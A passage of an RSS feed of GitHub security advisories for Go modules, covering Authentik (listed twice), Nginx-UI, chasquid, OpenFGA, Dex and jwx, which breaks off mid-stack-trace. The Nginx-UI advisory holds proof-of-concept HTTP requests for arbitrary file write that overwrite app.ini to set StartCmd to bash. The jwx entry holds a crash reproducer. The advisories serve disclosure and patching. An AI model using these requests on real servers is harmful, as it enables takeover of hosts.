<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2024-01-30T09:01:20.262Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[goauthentik.io] Authentik vulnerable to PKCE downgrade attack]]></title>
        <id>https://github.com/advisories/GHSA-mrx3-gxjx-hjqj</id>
        <link href="https://github.com/advisories/GHSA-mrx3-gxjx-hjqj"/>
        <updated>2024-01-29T22:30:59.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>PKCE is a very important countermeasure in OAuth2 , both for public and confidential clients. It protects against CSRF attacks and code injection attacks. Because of this bug, an attacker can circumvent the protection PKCE offers.</p>
<h2 id="patches">Patches</h2>
<p>authentik 2023.8.7 and 2023.10.7 fix this issue.</p>
<h2 id="details">Details</h2>
<p>There is a bug in our implementation of PKCE that allows an attacker to circumvent the protection that PKCE offers. PKCE adds the <code>code_challenge’ parameter to the authorization request and adds the </code>code_verifier’ parameter to the token request. We recently fixed a downgrade attack (in v2023.8.5 and 2023.10.4) where if the attacker removed the <code>code_verifier’ parameter in the token request, authentik would allow the request to pass, thus circumventing PKCE’s protection. However, in the latest version of the software, another downgrade scenario is still possible: if the attacker removes the </code>code_challenge’ parameter from the authorization request, authentik will also not do the PKCE check.</p>
<p>Note that this type of downgrade enables an attacker to perform a code injection attack, even if the OAuth client is using PKCE (which is supposed to protect against code injection attacks). To start the attack, the attacker must initiate the authorization process without that <code>code_challenge’ parameter in the authorization request. But this is easy to do (just use a phishing site or email to trick the user into clicking on a link that the attacker controls – the authorization link without that </code>code_challenge’ parameter).</p>
<p>The OAuth BCP (<a href="https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics">https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics</a>) explicitly mentions this particular attack in section 2.1.1: “Authorization servers MUST mitigate PKCE Downgrade Attacks by ensuring that a token request containing a code_verifier parameter is accepted only if a code_challenge parameter was present in the authorization request, see Section 4.8.2 for details.”</p>
<h2 id="for-more-information">For more information</h2>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Email us at <a href="mailto:security@goauthentik.io">security@goauthentik.io</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/goauthentik/authentik/security/advisories/GHSA-mrx3-gxjx-hjqj">https://github.com/goauthentik/authentik/security/advisories/GHSA-mrx3-gxjx-hjqj</a></li>
<li><a href="https://github.com/goauthentik/authentik/commit/38e04ae12720e5d81b4f7ac77997eb8d1275d31a">https://github.com/goauthentik/authentik/commit/38e04ae12720e5d81b4f7ac77997eb8d1275d31a</a></li>
<li><a href="https://github.com/advisories/GHSA-mrx3-gxjx-hjqj">https://github.com/advisories/GHSA-mrx3-gxjx-hjqj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mrx3-gxjx-hjqj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-29T22:30:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[goauthentik.io] Authentik vulnerable to PKCE downgrade attack]]></title>
        <id>https://github.com/advisories/GHSA-mrx3-gxjx-hjqj</id>
        <link href="https://github.com/advisories/GHSA-mrx3-gxjx-hjqj"/>
        <updated>2024-01-29T22:30:59.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>PKCE is a very important countermeasure in OAuth2 , both for public and confidential clients. It protects against CSRF attacks and code injection attacks. Because of this bug, an attacker can circumvent the protection PKCE offers.</p>
<h2 id="patches">Patches</h2>
<p>authentik 2023.8.7 and 2023.10.7 fix this issue.</p>
<h2 id="details">Details</h2>
<p>There is a bug in our implementation of PKCE that allows an attacker to circumvent the protection that PKCE offers. PKCE adds the <code>code_challenge’ parameter to the authorization request and adds the </code>code_verifier’ parameter to the token request. We recently fixed a downgrade attack (in v2023.8.5 and 2023.10.4) where if the attacker removed the <code>code_verifier’ parameter in the token request, authentik would allow the request to pass, thus circumventing PKCE’s protection. However, in the latest version of the software, another downgrade scenario is still possible: if the attacker removes the </code>code_challenge’ parameter from the authorization request, authentik will also not do the PKCE check.</p>
<p>Note that this type of downgrade enables an attacker to perform a code injection attack, even if the OAuth client is using PKCE (which is supposed to protect against code injection attacks). To start the attack, the attacker must initiate the authorization process without that <code>code_challenge’ parameter in the authorization request. But this is easy to do (just use a phishing site or email to trick the user into clicking on a link that the attacker controls – the authorization link without that </code>code_challenge’ parameter).</p>
<p>The OAuth BCP (<a href="https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics">https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics</a>) explicitly mentions this particular attack in section 2.1.1: “Authorization servers MUST mitigate PKCE Downgrade Attacks by ensuring that a token request containing a code_verifier parameter is accepted only if a code_challenge parameter was present in the authorization request, see Section 4.8.2 for details.”</p>
<h2 id="for-more-information">For more information</h2>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Email us at <a href="mailto:security@goauthentik.io">security@goauthentik.io</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/goauthentik/authentik/security/advisories/GHSA-mrx3-gxjx-hjqj">https://github.com/goauthentik/authentik/security/advisories/GHSA-mrx3-gxjx-hjqj</a></li>
<li><a href="https://github.com/goauthentik/authentik/commit/38e04ae12720e5d81b4f7ac77997eb8d1275d31a">https://github.com/goauthentik/authentik/commit/38e04ae12720e5d81b4f7ac77997eb8d1275d31a</a></li>
<li><a href="https://github.com/advisories/GHSA-mrx3-gxjx-hjqj">https://github.com/advisories/GHSA-mrx3-gxjx-hjqj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mrx3-gxjx-hjqj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-29T22:30:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/0xJacky/Nginx-UI] Nginx-UI vulnerable to authenticated RCE through injecting into the application config via CRLF]]></title>
        <id>https://github.com/advisories/GHSA-qcjq-7f7v-pvc8</id>
        <link href="https://github.com/advisories/GHSA-qcjq-7f7v-pvc8"/>
        <updated>2024-01-29T22:30:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Fix bypass to the following bugs</p>
<ul>
<li><a href="https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-pxmr-q2x3-9x9m">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-pxmr-q2x3-9x9m</a></li>
<li><a href="https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-8r25-68wm-jw35">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-8r25-68wm-jw35</a></li>
</ul>
<p>Allowing to inject directly in the <code>app.ini</code> via CRLF to change the value of <code>test_config_cmd</code> and <code>start_cmd</code> resulting in an Authenticated RCE</p>
<h3 id="impact">Impact</h3>
<p>Authenticated Remote execution on the host</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-qcjq-7f7v-pvc8">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-qcjq-7f7v-pvc8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23828">https://nvd.nist.gov/vuln/detail/CVE-2024-23828</a></li>
<li><a href="https://github.com/0xJacky/nginx-ui/commit/d70e37c8575e25b3da7203ff06da5e16c77a42d1">https://github.com/0xJacky/nginx-ui/commit/d70e37c8575e25b3da7203ff06da5e16c77a42d1</a></li>
<li><a href="https://github.com/advisories/GHSA-qcjq-7f7v-pvc8">https://github.com/advisories/GHSA-qcjq-7f7v-pvc8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qcjq-7f7v-pvc8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-29T22:30:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/0xJacky/Nginx-UI] Nginx-UI vulnerable to arbitrary file write through the Import Certificate feature]]></title>
        <id>https://github.com/advisories/GHSA-xvq9-4vpv-227m</id>
        <link href="https://github.com/advisories/GHSA-xvq9-4vpv-227m"/>
        <updated>2024-01-29T22:30:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Import Certificate feature allows arbitrary write into the system. The feature does not check if the provided user input is a certification/key and allows to write into arbitrary paths in the system.</p>
<p><a href="https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/api/certificate/certificate.go#L72">https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/api/certificate/certificate.go#L72</a></p>
<pre><code>func AddCert(c *gin.Context) {
    var json struct {
        Name                  string `json:"name"`
        SSLCertificatePath    string `json:"ssl_certificate_path" binding:"required"`
        SSLCertificateKeyPath string `json:"ssl_certificate_key_path" binding:"required"`
        SSLCertificate        string `json:"ssl_certificate"`
        SSLCertificateKey     string `json:"ssl_certificate_key"`
        ChallengeMethod       string `json:"challenge_method"`
        DnsCredentialID       int    `json:"dns_credential_id"`
    }
    if !api.BindAndValid(c, &amp;json) {
        return
    }
    certModel := &amp;model.Cert{
        Name:                  json.Name,
        SSLCertificatePath:    json.SSLCertificatePath,
        SSLCertificateKeyPath: json.SSLCertificateKeyPath,
        ChallengeMethod:       json.ChallengeMethod,
        DnsCredentialID:       json.DnsCredentialID,
    }

    err := certModel.Insert()

    if err != nil {
        api.ErrHandler(c, err)
        return
    }

    content := &amp;cert.Content{
        SSLCertificatePath:    json.SSLCertificatePath,
        SSLCertificateKeyPath: json.SSLCertificateKeyPath,
        SSLCertificate:        json.SSLCertificate,
        SSLCertificateKey:     json.SSLCertificateKey,
    }

    err = content.WriteFile()

    if err != nil {
        api.ErrHandler(c, err)
        return
    }

    c.JSON(http.StatusOK, Transformer(certModel))
}
</code></pre>
<p><a href="https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/internal/cert/write_file.go#L15">https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/internal/cert/write_file.go#L15</a></p>
<pre><code>func (c *Content) WriteFile() (err error) {
    // MkdirAll creates a directory named path, along with any necessary parents,
    // and returns nil, or else returns an error.
    // The permission bits perm (before umask) are used for all directories that MkdirAll creates.
    // If path is already a directory, MkdirAll does nothing and returns nil.

    err = os.MkdirAll(filepath.Dir(c.SSLCertificatePath), 0644)
    if err != nil {
        return
    }

    err = os.MkdirAll(filepath.Dir(c.SSLCertificateKeyPath), 0644)
    if err != nil {
        return
    }

    if c.SSLCertificate != "" {
        err = os.WriteFile(c.SSLCertificatePath, []byte(c.SSLCertificate), 0644)
        if err != nil {
            return
        }
    }

    if c.SSLCertificateKey != "" {
        err = os.WriteFile(c.SSLCertificateKeyPath, []byte(c.SSLCertificateKey), 0644)
        if err != nil {
            return
        }
    }

    return
}
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code>POST /api/cert HTTP/1.1
Host: 127.0.0.1:9000
Content-Length: 144
Accept: application/json, text/plain, */*
Authorization: &lt;JWT&gt;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,fr;q=0.7
Connection: close

{"name":"poc","ssl_certificate_path":"/tmp/test","ssl_certificate_key_path":"/tmp/test2","ssl_certificate":"test","ssl_certificate_key":"test2"}
</code></pre>
<pre><code>root@aze:~/nginx# ls -la /tmp/test*
-rw-r--r-- 1 root root 4 Jan 24 13:33 /tmp/test
-rw-r--r-- 1 root root 5 Jan 24 13:33 /tmp/test2
</code></pre>
<p>It's possible to leverage it into an RCE in a senario by overwriting the config file app.ini - But it will require the app.</p>
<pre><code>root@aze:~/nginx# cat app.ini  | grep "StartCmd"
StartCmd          = login
</code></pre>
<p>Then we overwrite the <code>StartCmd</code> with <code>bash</code></p>
<pre><code>POST /api/cert HTTP/1.1
Host: 127.0.0.1:9000
Content-Length: 980
Accept: application/json, text/plain, */*
Authorization: &lt;JWT&gt;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,fr;q=0.7
Connection: close

{"name":"poc","ssl_certificate_path":"/root/nginx/app.ini","ssl_certificate_key_path":"/tmp/test2","ssl_certificate":"[server]\r\nHttpHost          = 0.0.0.0\r\nHttpPort          = 9000\r\nRunMode           = debug\r\nJwtSecret         = 504f334b-ac68-4fbc-9160-2ecbf9e5794c\r\nNodeSecret        = 139ab224-9e9e-444f-987e-b3a651175ad5\r\nHTTPChallengePort = 9180\r\nEmail             = props@pros.com\r\nDatabase          = database\r\nStartCmd          = bash\r\nCADir             = dqsdqsd\r\nDemo              = false\r\nPageSize          = 10\r\nGithubProxy       = dqsdqfsdfsdfsdfsd\r\n\r\n[nginx]\r\nAccessLogPath =\r\nErrorLogPath  =\r\nConfigDir     =\r\nPIDPath       =\r\nTestConfigCmd =\r\nReloadCmd     =\r\nRestartCmd    =\r\n\r\n[openai]\r\nBaseUrl = \r\nToken   =\r\nProxy   =\r\nModel   = \r\n\r\n[casdoor]\r\nEndpoint     =\r\nClientId     =\r\nClientSecret =\r\nCertificate  =\r\nOrganization =\r\nApplication  =\r\nRedirectUri  =","ssl_certificate_key":"test2"}
</code></pre>
<pre><code>root@aze:~/nginx# cat app.ini  | grep "StartCmd"
StartCmd          = bash
</code></pre>
<p>For the new config to be applied the app needs to be restarted</p>
<p><img alt="image" src="https://user-images.githubusercontent.com/26652608/299331664-6415a8c1-6611-4e53-8137-3e574c58da28.png"></p>
<h3 id="impact">Impact</h3>
<p>Arbitrary write/overwrite into the host file system with a risk of remote code execution if the app restarts.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-xvq9-4vpv-227m">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-xvq9-4vpv-227m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23827">https://nvd.nist.gov/vuln/detail/CVE-2024-23827</a></li>
<li><a href="https://github.com/0xJacky/nginx-ui/commit/8581bdd3c6f49ab345b773517ba9173fa7fc6199">https://github.com/0xJacky/nginx-ui/commit/8581bdd3c6f49ab345b773517ba9173fa7fc6199</a></li>
<li><a href="https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/api/certificate/certificate.go#L72">https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/api/certificate/certificate.go#L72</a></li>
<li><a href="https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/internal/cert/write_file.go#L15">https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/internal/cert/write_file.go#L15</a></li>
<li><a href="https://github.com/advisories/GHSA-xvq9-4vpv-227m">https://github.com/advisories/GHSA-xvq9-4vpv-227m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xvq9-4vpv-227m</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-01-29T22:30:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/albertito/chasquid] chasquid HTTP Request/Response Smuggling vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-g4x3-mfpj-f335</id>
        <link href="https://github.com/advisories/GHSA-g4x3-mfpj-f335"/>
        <updated>2024-01-29T22:29:09.000Z</updated>
        <content type="html"><![CDATA[<p>chasquid before 1.13 allows SMTP smuggling because LF-terminated lines are accepted.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-52354">https://nvd.nist.gov/vuln/detail/CVE-2023-52354</a></li>
<li><a href="https://blitiri.com.ar/p/chasquid/relnotes/#113-2023-12-24">https://blitiri.com.ar/p/chasquid/relnotes/#113-2023-12-24</a></li>
<li><a href="https://github.com/albertito/chasquid/issues/47">https://github.com/albertito/chasquid/issues/47</a></li>
<li><a href="https://github.com/albertito/chasquid/commit/a996106eeebe81a292ecba838c7503cac7493e74">https://github.com/albertito/chasquid/commit/a996106eeebe81a292ecba838c7503cac7493e74</a></li>
<li><a href="https://github.com/advisories/GHSA-g4x3-mfpj-f335">https://github.com/advisories/GHSA-g4x3-mfpj-f335</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g4x3-mfpj-f335</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-22T06:30:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/openfga/openfga] OpenFGA denial of service]]></title>
        <id>https://github.com/advisories/GHSA-rxpw-85vw-fx87</id>
        <link href="https://github.com/advisories/GHSA-rxpw-85vw-fx87"/>
        <updated>2024-01-26T20:12:00.000Z</updated>
        <content type="html"><![CDATA[<h2 id="overview">Overview</h2>
<p>OpenFGA is vulnerable to a DoS attack. In some scenarios that depend on the model and tuples used, a call to ListObjects may not  release memory properly. So when a sufficiently high number of those calls are executed, the OpenFGA server can create an "out of memory" error and terminate.</p>
<h2 id="fix">Fix</h2>
<p>Upgrade to v1.4.3. This upgrade is backwards compatible.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openfga/openfga/security/advisories/GHSA-rxpw-85vw-fx87">https://github.com/openfga/openfga/security/advisories/GHSA-rxpw-85vw-fx87</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23820">https://nvd.nist.gov/vuln/detail/CVE-2024-23820</a></li>
<li><a href="https://github.com/openfga/openfga/commit/908ac85c8b7769c8042cca31886df8db01976c39">https://github.com/openfga/openfga/commit/908ac85c8b7769c8042cca31886df8db01976c39</a></li>
<li><a href="https://github.com/openfga/openfga/releases/tag/v1.4.3">https://github.com/openfga/openfga/releases/tag/v1.4.3</a></li>
<li><a href="https://github.com/advisories/GHSA-rxpw-85vw-fx87">https://github.com/advisories/GHSA-rxpw-85vw-fx87</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rxpw-85vw-fx87</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-26T20:12:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/dexidp/dex] Dex discarding TLSconfig and always serves deprecated TLS 1.0/1.1 and insecure ciphers]]></title>
        <id>https://github.com/advisories/GHSA-gr79-9v6v-gc9r</id>
        <link href="https://github.com/advisories/GHSA-gr79-9v6v-gc9r"/>
        <updated>2024-01-26T01:57:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Dex 2.37.0 is serving HTTPS with insecure TLS 1.0 and TLS 1.1.</p>
<h3 id="details">Details</h3>
<p>While working on <a href="https://github.com/dexidp/dex/issues/2848">https://github.com/dexidp/dex/issues/2848</a> and implementing configurable TLS support, I noticed my changes did not have any effect in TLS config, so I started investigating. </p>
<p><a href="https://github.com/dexidp/dex/blob/70d7a2c7c1bb2646b1a540e49616cbc39622fb83/cmd/dex/serve.go#L425">https://github.com/dexidp/dex/blob/70d7a2c7c1bb2646b1a540e49616cbc39622fb83/cmd/dex/serve.go#L425</a> is seemingly setting TLS 1.2 as minimum version, but the whole tlsConfig is ignored after "TLS cert reloader" was introduced in <a href="https://github.com/dexidp/dex/pull/2964">https://github.com/dexidp/dex/pull/2964</a>. Configured cipher suites are not respected either, as seen on the output.</p>
<h3 id="poc">PoC</h3>
<p>Build Dex, generate certs with <code>gencert.sh</code>, modify <code>config.dev.yaml</code> to run on https, using generated certs.</p>
<pre><code class="language-console">issuer: http://127.0.0.1:5556/dex

storage:
  type: sqlite3
  config:
    file: dex.db

web:
  https: 127.0.0.1:5556
  tlsCert: examples/k8s/ssl/cert.pem
  tlsKey: examples/k8s/ssl/key.pem

&lt;rest as default&gt;
</code></pre>
<p>Run dex <code>bin/dex serve config.dev.yaml</code>.</p>
<p>Install <code>sslyze</code>, easy to use SSL connection analyzer:</p>
<pre><code class="language-console">pip3 install sslyze
sslyze 127.0.0.1:5556
</code></pre>
<p>In Dex 2.37.0, TLS 1.0 and TLS 1.1 are enabled in addition to expected TLS 1.2 and TLS 1.3.</p>
<pre><code class="language-console"> * TLS 1.0 Cipher Suites:
     Attempted to connect using 80 cipher suites.

     The server accepted the following 6 cipher suites:
        TLS_RSA_WITH_AES_256_CBC_SHA                      256                      
        TLS_RSA_WITH_AES_128_CBC_SHA                      128                      
        TLS_RSA_WITH_3DES_EDE_CBC_SHA                     168                      
        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                256       ECDH: prime256v1 (256 bits)
        TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                128       ECDH: prime256v1 (256 bits)
        TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA               168       ECDH: prime256v1 (256 bits)

     The group of cipher suites supported by the server has the following properties:
       Forward Secrecy                    OK - Supported
       Legacy RC4 Algorithm               OK - Not Supported


 * TLS 1.1 Cipher Suites:
     Attempted to connect using 80 cipher suites.

     The server accepted the following 6 cipher suites:
        TLS_RSA_WITH_AES_256_CBC_SHA                      256                      
        TLS_RSA_WITH_AES_128_CBC_SHA                      128                      
        TLS_RSA_WITH_3DES_EDE_CBC_SHA                     168                      
        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                256       ECDH: prime256v1 (256 bits)
        TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                128       ECDH: prime256v1 (256 bits)
        TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA               168       ECDH: prime256v1 (256 bits)

     The group of cipher suites supported by the server has the following properties:
       Forward Secrecy                    OK - Supported
       Legacy RC4 Algorithm               OK - Not Supported


 * TLS 1.2 Cipher Suites:
     Attempted to connect using 156 cipher suites.

     The server accepted the following 11 cipher suites:
        TLS_RSA_WITH_AES_256_GCM_SHA384                   256                      
        TLS_RSA_WITH_AES_256_CBC_SHA                      256                      
        TLS_RSA_WITH_AES_128_GCM_SHA256                   128                      
        TLS_RSA_WITH_AES_128_CBC_SHA                      128                      
        TLS_RSA_WITH_3DES_EDE_CBC_SHA                     168                      
        TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256       256       ECDH: X25519 (253 bits)
        TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384             256       ECDH: prime256v1 (256 bits)
        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                256       ECDH: prime256v1 (256 bits)
        TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256             128       ECDH: prime256v1 (256 bits)
        TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                128       ECDH: prime256v1 (256 bits)
        TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA               168       ECDH: prime256v1 (256 bits)

     The group of cipher suites supported by the server has the following properties:
       Forward Secrecy                    OK - Supported
       Legacy RC4 Algorithm               OK - Not Supported


 * TLS 1.3 Cipher Suites:
     Attempted to connect using 5 cipher suites.

     The server accepted the following 3 cipher suites:
        TLS_CHACHA20_POLY1305_SHA256                      256       ECDH: X25519 (253 bits)
        TLS_AES_256_GCM_SHA384                            256       ECDH: X25519 (253 bits)
        TLS_AES_128_GCM_SHA256                            128       ECDH: X25519 (253 bits)
</code></pre>
<p>In Dex 2.36.0, TLS 1.0 and TLS 1.1 are disabled as expected.</p>
<pre><code class="language-console"> * TLS 1.0 Cipher Suites:
     Attempted to connect using 80 cipher suites; the server rejected all cipher suites.

 * TLS 1.1 Cipher Suites:
     Attempted to connect using 80 cipher suites; the server rejected all cipher suites.

 * TLS 1.2 Cipher Suites:
     Attempted to connect using 156 cipher suites.

     The server accepted the following 5 cipher suites:
        TLS_RSA_WITH_AES_256_GCM_SHA384                   256                      
        TLS_RSA_WITH_AES_128_GCM_SHA256                   128                      
        TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256       256       ECDH: X25519 (253 bits)
        TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384             256       ECDH: prime256v1 (256 bits)
        TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256             128       ECDH: prime256v1 (256 bits)

     The group of cipher suites supported by the server has the following properties:
       Forward Secrecy                    OK - Supported
       Legacy RC4 Algorithm               OK - Not Supported


 * TLS 1.3 Cipher Suites:
     Attempted to connect using 5 cipher suites.

     The server accepted the following 3 cipher suites:
        TLS_CHACHA20_POLY1305_SHA256                      256       ECDH: X25519 (253 bits)
        TLS_AES_256_GCM_SHA384                            256       ECDH: X25519 (253 bits)
</code></pre>
<h3 id="impact">Impact</h3>
<p>TLS 1.0 and TLS 1.1 connections can be decrypted by the attacker, and hence decrypt the traffic to Dex.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dexidp/dex/security/advisories/GHSA-gr79-9v6v-gc9r">https://github.com/dexidp/dex/security/advisories/GHSA-gr79-9v6v-gc9r</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23656">https://nvd.nist.gov/vuln/detail/CVE-2024-23656</a></li>
<li><a href="https://github.com/dexidp/dex/issues/2848">https://github.com/dexidp/dex/issues/2848</a></li>
<li><a href="https://github.com/dexidp/dex/pull/2964">https://github.com/dexidp/dex/pull/2964</a></li>
<li><a href="https://github.com/dexidp/dex/commit/5bbdb4420254ba73b9c4df4775fe7bdacf233b17">https://github.com/dexidp/dex/commit/5bbdb4420254ba73b9c4df4775fe7bdacf233b17</a></li>
<li><a href="https://github.com/dexidp/dex/blob/70d7a2c7c1bb2646b1a540e49616cbc39622fb83/cmd/dex/serve.go#L425">https://github.com/dexidp/dex/blob/70d7a2c7c1bb2646b1a540e49616cbc39622fb83/cmd/dex/serve.go#L425</a></li>
<li><a href="https://github.com/advisories/GHSA-gr79-9v6v-gc9r">https://github.com/advisories/GHSA-gr79-9v6v-gc9r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gr79-9v6v-gc9r</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-26T01:57:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/lestrrat-go/jwx] Parsing JSON serialized payload without protected field can lead to segfault]]></title>
        <id>https://github.com/advisories/GHSA-pvcr-v8j8-j5q3</id>
        <link href="https://github.com/advisories/GHSA-pvcr-v8j8-j5q3"/>
        <updated>2024-01-24T16:16:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Calling <code>jws.Parse</code> with a JSON serialized payload where the <code>signature</code> field is present while <code>protected</code> is absent can lead to a nil pointer dereference.</p>
<h3 id="details">Details</h3>
<p>This seems to also affect other functions that calls <code>Parse</code> internally, like <code>jws.Verify</code>.</p>
<p>My understanding of these functions from the docs is that they are supposed to fail gracefully on invalid input and don't require any prior validation.</p>
<p>Based on the stack trace in the PoC, the issue seems to be that the processing done in <code>jws/message.go:UnmarshalJSON()</code> assumes that if a <code>signature</code> field is present, then a <code>protected</code> field is also present. If this is not the case, then the subsequent call to <code>getB64Value(sig.protected)</code> will dereference <code>sig.protected</code>, which is <code>nil</code>.</p>
<h3 id="poc">PoC</h3>
<p>Reproducer:</p>
<pre><code class="language-go">package poc

import (
        "testing"

        "github.com/lestrrat-go/jwx/v2/jws"
)

func TestPOC(t *testing.T) {
        _, _ = jws.Parse([]byte(`{"signature": ""}`))
}
</code></pre>
<p>Result:</p>
<pre><code>$ go test        
--- FAIL: TestPOC (0.00s)
panic: runtime error: invalid memory address or nil pointer dereference [recovered]
        panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x40 pc=0x5fd618]

goroutine 6 [running]:
testing.tRunner.func1.2({0x628800, 0x831030})
        /usr/local/go/src/testing/testing.go:1545 +0x238
testing.tRunner.func1()
        /usr/local/go/src/testing/testing.go:1548 +0x397
panic({0x628800?, 0x831030?})
        /usr/local/go/src/runtime/panic.go:914 +0x21f
github.com/lestrrat-go/jwx/v2/jws.getB64Value({0x0?, 0x0?})
        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/jws/jws.go:484 +0x18
github.com/lestrrat-go/jwx/v2/jws.(*Message).UnmarshalJSON(0xc0000a2140, {0xc0000ec000, 0x11, 0x200})
        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/jws/message.go:323 +0x4ad
